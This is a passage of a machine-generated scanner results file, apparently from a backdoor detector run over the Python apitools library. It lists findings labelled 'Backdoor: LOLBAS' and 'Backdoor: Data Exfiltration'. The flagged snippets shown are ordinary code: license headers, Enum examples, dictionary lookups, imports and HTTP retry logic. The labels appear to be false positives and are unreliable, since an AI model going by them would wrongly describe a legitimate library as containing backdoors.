                      "markdown": "`\n        # pylint:disable=unused-variable\n        class Color(messages.Enum):\n            RED = 20\n            ORANGE = 2\n            YELLOW = 40\n            GREEN = 4\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1935,
                  "startColumn": 25,
                  "endLine": 1935,
                  "endColumn": 29,
                  "snippet": {
                    "text": "                                this part of search --+\n\n        Returns:\n          Message or Enum at the end of name_path, else None.\n        \"\"\"\n        next_part = relative_to\n        for node in name_path:\n",
                    "rendered": {
                      "text": "                                this part of search --+\n\n        Returns:\n          Message or Enum at the end of name_path, else None.\n        \"\"\"\n        next_part = relative_to\n        for node in name_path:\n",
                      "markdown": "`                                this part of search --+\n\n        Returns:\n          Message or Enum at the end of name_path, else None.\n        \"\"\"\n        next_part = relative_to\n        for node in name_path:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1987,
                  "startColumn": 21,
                  "endLine": 1987,
                  "endColumn": 27,
                  "snippet": {
                    "text": "                    'Could not find definition for %s' % name)\n            else:\n                if isinstance(relative_to, types.ModuleType):\n                    # Find parent module.\n                    module_path = relative_to.__name__.split('.')[:-1]\n                    if not module_path:\n                        relative_to = None\n",
                    "rendered": {
                      "text": "                    'Could not find definition for %s' % name)\n            else:\n                if isinstance(relative_to, types.ModuleType):\n                    # Find parent module.\n                    module_path = relative_to.__name__.split('.')[:-1]\n                    if not module_path:\n                        relative_to = None\n",
                      "markdown": "`                    'Could not find definition for %s' % name)\n            else:\n                if isinstance(relative_to, types.ModuleType):\n                    # Find parent module.\n                    module_path = relative_to.__name__.split('.')[:-1]\n                    if not module_path:\n                        relative_to = None\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1984,
                  "startColumn": 30,
                  "endLine": 1984,
                  "endColumn": 36,
                  "snippet": {
                    "text": "            if relative_to is None:\n                # Fully qualified search was done.  Nothing found.  Fail.\n                raise DefinitionNotFoundError(\n                    'Could not find definition for %s' % name)\n            else:\n                if isinstance(relative_to, types.ModuleType):\n                    # Find parent module.\n",
                    "rendered": {
                      "text": "            if relative_to is None:\n                # Fully qualified search was done.  Nothing found.  Fail.\n                raise DefinitionNotFoundError(\n                    'Could not find definition for %s' % name)\n            else:\n                if isinstance(relative_to, types.ModuleType):\n                    # Find parent module.\n",
                      "markdown": "`            if relative_to is None:\n                # Fully qualified search was done.  Nothing found.  Fail.\n                raise DefinitionNotFoundError(\n                    'Could not find definition for %s' % name)\n            else:\n                if isinstance(relative_to, types.ModuleType):\n                    # Find parent module.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1974,
                  "startColumn": 13,
                  "endLine": 1974,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        if isinstance(found, type) and issubclass(found, (Enum, Message)):\n            return found\n        else:\n            # Find next relative_to to search against.\n            #\n            #   fully.qualified.object . relative.or.nested.Definition\n            #   <---------------------\n",
                    "rendered": {
                      "text": "        if isinstance(found, type) and issubclass(found, (Enum, Message)):\n            return found\n        else:\n            # Find next relative_to to search against.\n            #\n            #   fully.qualified.object . relative.or.nested.Definition\n            #   <---------------------\n",
                      "markdown": "`        if isinstance(found, type) and issubclass(found, (Enum, Message)):\n            return found\n        else:\n            # Find next relative_to to search against.\n            #\n            #   fully.qualified.object . relative.or.nested.Definition\n            #   <---------------------\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1949,
                  "startColumn": 37,
                  "endLine": 1950,
                  "snippet": {
                    "text": "                if (next_part is None or\n                        isinstance(next_part, types.ModuleType)):\n                    if next_part is None:\n                        module_name = node\n                    else:\n                        module_name = '%s.%s' % (next_part.__name__, node)\n\n                    try:\n",
                    "rendered": {
                      "text": "                if (next_part is None or\n                        isinstance(next_part, types.ModuleType)):\n                    if next_part is None:\n                        module_name = node\n                    else:\n                        module_name = '%s.%s' % (next_part.__name__, node)\n\n                    try:\n",
                      "markdown": "`                if (next_part is None or\n                        isinstance(next_part, types.ModuleType)):\n                    if next_part is None:\n                        module_name = node\n                    else:\n                        module_name = '%s.%s' % (next_part.__name__, node)\n\n                    try:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1938,
                  "startColumn": 11,
                  "endLine": 1938,
                  "endColumn": 17,
                  "snippet": {
                    "text": "          Message or Enum at the end of name_path, else None.\n        \"\"\"\n        next_part = relative_to\n        for node in name_path:\n            # Look for attribute first.\n            attribute = getattr(next_part, node, None)\n\n",
                    "rendered": {
                      "text": "          Message or Enum at the end of name_path, else None.\n        \"\"\"\n        next_part = relative_to\n        for node in name_path:\n            # Look for attribute first.\n            attribute = getattr(next_part, node, None)\n\n",
                      "markdown": "`          Message or Enum at the end of name_path, else None.\n        \"\"\"\n        next_part = relative_to\n        for node in name_path:\n            # Look for attribute first.\n            attribute = getattr(next_part, node, None)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1850,
                  "startColumn": 7,
                  "endLine": 1850,
                  "endColumn": 13,
                  "snippet": {
                    "text": "def find_definition(name, relative_to=None, importer=__import__):\n    \"\"\"Find definition by name in module-space.\n\n    The find algorthm will look for definitions by name relative to a\n    message definition or by fully qualfied name. If no definition is\n    found relative to the relative_to parameter it will do the same\n    search against the container of relative_to. If relative_to is a\n",
                    "rendered": {
                      "text": "def find_definition(name, relative_to=None, importer=__import__):\n    \"\"\"Find definition by name in module-space.\n\n    The find algorthm will look for definitions by name relative to a\n    message definition or by fully qualfied name. If no definition is\n    found relative to the relative_to parameter it will do the same\n    search against the container of relative_to. If relative_to is a\n",
                      "markdown": "`def find_definition(name, relative_to=None, importer=__import__):\n    \"\"\"Find definition by name in module-space.\n\n    The find algorthm will look for definitions by name relative to a\n    message definition or by fully qualfied name. If no definition is\n    found relative to the relative_to parameter it will do the same\n    search against the container of relative_to. If relative_to is a\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1744,
                  "startColumn": 9,
                  "endLine": 1744,
                  "endColumn": 14,
                  "snippet": {
                    "text": "        class Animal(Enum):\n\n          DOG = 1\n          CAT = 2\n          HORSE = 3\n\n        # This fields default value will be validated right away since Color\n",
                    "rendered": {
                      "text": "        class Animal(Enum):\n\n          DOG = 1\n          CAT = 2\n          HORSE = 3\n\n        # This fields default value will be validated right away since Color\n",
                      "markdown": "`        class Animal(Enum):\n\n          DOG = 1\n          CAT = 2\n          HORSE = 3\n\n        # This fields default value will be validated right away since Color\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1732,
                  "startColumn": 9,
                  "endLine": 1732,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n        class Color(Enum):\n\n          RED = 1\n          GREEN = 2\n          BLUE = 3\n\n",
                    "rendered": {
                      "text": "\n        class Color(Enum):\n\n          RED = 1\n          GREEN = 2\n          BLUE = 3\n\n",
                      "markdown": "`\n        class Color(Enum):\n\n          RED = 1\n          GREEN = 2\n          BLUE = 3\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1302,
                  "startColumn": 48,
                  "endLine": 1302,
                  "endColumn": 53,
                  "snippet": {
                    "text": "        if message_instance is None:\n            return self\n\n        result = message_instance._Message__tags.get(self.number)\n        if result is None:\n            return self.default\n        return result\n",
                    "rendered": {
                      "text": "        if message_instance is None:\n            return self\n\n        result = message_instance._Message__tags.get(self.number)\n        if result is None:\n            return self.default\n        return result\n",
                      "markdown": "`        if message_instance is None:\n            return self\n\n        result = message_instance._Message__tags.get(self.number)\n        if result is None:\n            return self.default\n        return result\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 1162,
                  "startColumn": 45,
                  "endLine": 1162,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n    def __init__(cls, name, bases, dct):\n        getattr(cls, '_Field__variant_to_type').update(\n            (variant, cls) for variant in dct.get('VARIANTS', []))\n        type.__init__(cls, name, bases, dct)\n\n\n",
                    "rendered": {
                      "text": "\n    def __init__(cls, name, bases, dct):\n        getattr(cls, '_Field__variant_to_type').update(\n            (variant, cls) for variant in dct.get('VARIANTS', []))\n        type.__init__(cls, name, bases, dct)\n\n\n",
                      "markdown": "`\n    def __init__(cls, name, bases, dct):\n        getattr(cls, '_Field__variant_to_type').update(\n            (variant, cls) for variant in dct.get('VARIANTS', []))\n        type.__init__(cls, name, bases, dct)\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 938,
                  "startColumn": 51,
                  "endLine": 938,
                  "endColumn": 56,
                  "snippet": {
                    "text": "          (value, variant), where value and variant are whatever was passed\n          to set_unrecognized_field.\n        \"\"\"\n        value, variant = self.__unrecognized_fields.get(key, (value_default,\n                                                              variant_default))\n        return value, variant\n\n",
                    "rendered": {
                      "text": "          (value, variant), where value and variant are whatever was passed\n          to set_unrecognized_field.\n        \"\"\"\n        value, variant = self.__unrecognized_fields.get(key, (value_default,\n                                                              variant_default))\n        return value, variant\n\n",
                      "markdown": "`          (value, variant), where value and variant are whatever was passed\n          to set_unrecognized_field.\n        \"\"\"\n        value, variant = self.__unrecognized_fields.get(key, (value_default,\n                                                              variant_default))\n        return value, variant\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/messages.py"
                },
                "region": {
                  "startLine": 898,
                  "startColumn": 26,
                  "endLine": 898,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        except KeyError:\n            raise AttributeError('Message %s has no field %s' % (\n                message_type.__name__, name))\n        return self.__tags.get(field.number)\n\n    def reset(self, name):\n        \"\"\"Reset assigned value for field.\n",
                    "rendered": {
                      "text": "        except KeyError:\n            raise AttributeError('Message %s has no field %s' % (\n                message_type.__name__, name))\n        return self.__tags.get(field.number)\n\n    def reset(self, name):\n        \"\"\"Reset assigned value for field.\n",
                      "markdown": "`        except KeyError:\n            raise AttributeError('Message %s has no field %s' % (\n                message_type.__name__, name))\n        return self.__tags.get(field.number)\n\n    def reset(self, name):\n        \"\"\"Reset assigned value for field.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/protorpclite/__init__.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 394,
                  "startColumn": 26,
                  "endLine": 394,
                  "endColumn": 30,
                  "snippet": {
                    "text": "        if url_scheme and url_scheme in http.connections:\n            connection_type = http.connections[url_scheme]\n\n    # Custom printing only at debuglevel 4\n    new_debuglevel = 4 if httplib2.debuglevel == 4 else 0\n    with _Httplib2Debuglevel(http_request, new_debuglevel, http=http):\n        info, content = http.request(\n",
                    "rendered": {
                      "text": "        if url_scheme and url_scheme in http.connections:\n            connection_type = http.connections[url_scheme]\n\n    # Custom printing only at debuglevel 4\n    new_debuglevel = 4 if httplib2.debuglevel == 4 else 0\n    with _Httplib2Debuglevel(http_request, new_debuglevel, http=http):\n        info, content = http.request(\n",
                      "markdown": "`        if url_scheme and url_scheme in http.connections:\n            connection_type = http.connections[url_scheme]\n\n    # Custom printing only at debuglevel 4\n    new_debuglevel = 4 if httplib2.debuglevel == 4 else 0\n    with _Httplib2Debuglevel(http_request, new_debuglevel, http=http):\n        info, content = http.request(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 387,
                  "startColumn": 11,
                  "endLine": 387,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    \"\"\"\n    connection_type = None\n    # Handle overrides for connection types.  This is used if the caller\n    # wants control over the underlying connection for managing callbacks\n    # or hash digestion.\n    if getattr(http, 'connections', None):\n        url_scheme = parse.urlsplit(http_request.url).scheme\n",
                    "rendered": {
                      "text": "    \"\"\"\n    connection_type = None\n    # Handle overrides for connection types.  This is used if the caller\n    # wants control over the underlying connection for managing callbacks\n    # or hash digestion.\n    if getattr(http, 'connections', None):\n        url_scheme = parse.urlsplit(http_request.url).scheme\n",
                      "markdown": "`    \"\"\"\n    connection_type = None\n    # Handle overrides for connection types.  This is used if the caller\n    # wants control over the underlying connection for managing callbacks\n    # or hash digestion.\n    if getattr(http, 'connections', None):\n        url_scheme = parse.urlsplit(http_request.url).scheme\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 277,
                  "startColumn": 26,
                  "endLine": 277,
                  "endColumn": 35,
                  "snippet": {
                    "text": "            'Caught socket address error, retrying: %s', retry_args.exc)\n    elif isinstance(retry_args.exc, socket.timeout):\n        logging.debug(\n            'Caught socket timeout error, retrying: %s', retry_args.exc)\n    elif isinstance(retry_args.exc, httplib2.ServerNotFoundError):\n        logging.debug(\n            'Caught server not found error, retrying: %s', retry_args.exc)\n",
                    "rendered": {
                      "text": "            'Caught socket address error, retrying: %s', retry_args.exc)\n    elif isinstance(retry_args.exc, socket.timeout):\n        logging.debug(\n            'Caught socket timeout error, retrying: %s', retry_args.exc)\n    elif isinstance(retry_args.exc, httplib2.ServerNotFoundError):\n        logging.debug(\n            'Caught server not found error, retrying: %s', retry_args.exc)\n",
                      "markdown": "`            'Caught socket address error, retrying: %s', retry_args.exc)\n    elif isinstance(retry_args.exc, socket.timeout):\n        logging.debug(\n            'Caught socket timeout error, retrying: %s', retry_args.exc)\n    elif isinstance(retry_args.exc, httplib2.ServerNotFoundError):\n        logging.debug(\n            'Caught server not found error, retrying: %s', retry_args.exc)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 261,
                  "startColumn": 24,
                  "endLine": 261,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      retry_args: An ExceptionRetryArgs tuple.\n    \"\"\"\n    # If the server indicates how long to wait, use that value.  Otherwise,\n    # calculate the wait time on our own.\n    retry_after = None\n\n    # Transport failures\n",
                    "rendered": {
                      "text": "      retry_args: An ExceptionRetryArgs tuple.\n    \"\"\"\n    # If the server indicates how long to wait, use that value.  Otherwise,\n    # calculate the wait time on our own.\n    retry_after = None\n\n    # Transport failures\n",
                      "markdown": "`      retry_args: An ExceptionRetryArgs tuple.\n    \"\"\"\n    # If the server indicates how long to wait, use that value.  Otherwise,\n    # calculate the wait time on our own.\n    retry_after = None\n\n    # Transport failures\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 6,
                  "endLine": 28,
                  "snippet": {
                    "text": "import contextlib\nimport logging\nimport socket\nimport time\n\nimport httplib2\nimport six\nfrom six.moves import http_client\n",
                    "rendered": {
                      "text": "import contextlib\nimport logging\nimport socket\nimport time\n\nimport httplib2\nimport six\nfrom six.moves import http_client\n",
                      "markdown": "`import contextlib\nimport logging\nimport socket\nimport time\n\nimport httplib2\nimport six\nfrom six.moves import http_client\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 4,
                  "endLine": 46,
                  "endColumn": 47,
                  "snippet": {
                    "text": "__all__ = [\n    'CheckResponse',\n    'GetHttp',\n    'HandleExceptionsAndRebuildHttpConnections',\n    'MakeRequest',\n    'RebuildHttpConnections',\n    'Request',\n",
                    "rendered": {
                      "text": "__all__ = [\n    'CheckResponse',\n    'GetHttp',\n    'HandleExceptionsAndRebuildHttpConnections',\n    'MakeRequest',\n    'RebuildHttpConnections',\n    'Request',\n",
                      "markdown": "`__all__ = [\n    'CheckResponse',\n    'GetHttp',\n    'HandleExceptionsAndRebuildHttpConnections',\n    'MakeRequest',\n    'RebuildHttpConnections',\n    'Request',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 397,
                  "startColumn": 28,
                  "endLine": 397,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    # Custom printing only at debuglevel 4\n    new_debuglevel = 4 if httplib2.debuglevel == 4 else 0\n    with _Httplib2Debuglevel(http_request, new_debuglevel, http=http):\n        info, content = http.request(\n            str(http_request.url), method=str(http_request.http_method),\n            body=http_request.body, headers=http_request.headers,\n            redirections=redirections, connection_type=connection_type)\n",
                    "rendered": {
                      "text": "    # Custom printing only at debuglevel 4\n    new_debuglevel = 4 if httplib2.debuglevel == 4 else 0\n    with _Httplib2Debuglevel(http_request, new_debuglevel, http=http):\n        info, content = http.request(\n            str(http_request.url), method=str(http_request.http_method),\n            body=http_request.body, headers=http_request.headers,\n            redirections=redirections, connection_type=connection_type)\n",
                      "markdown": "`    # Custom printing only at debuglevel 4\n    new_debuglevel = 4 if httplib2.debuglevel == 4 else 0\n    with _Httplib2Debuglevel(http_request, new_debuglevel, http=http):\n        info, content = http.request(\n            str(http_request.url), method=str(http_request.http_method),\n            body=http_request.body, headers=http_request.headers,\n            redirections=redirections, connection_type=connection_type)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/http_wrapper.py"
                },
                "region": {
                  "startLine": 195,
                  "startColumn": 32,
                  "endLine": 195,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            # case, but we *can* trust content-range, if it's present.\n            return ProcessContentRange(self.info['content-range'])\n        elif 'content-length' in self.info:\n            return int(self.info.get('content-length'))\n        elif 'content-range' in self.info:\n            return ProcessContentRange(self.info['content-range'])\n        return len(self.content)\n",
                    "rendered": {
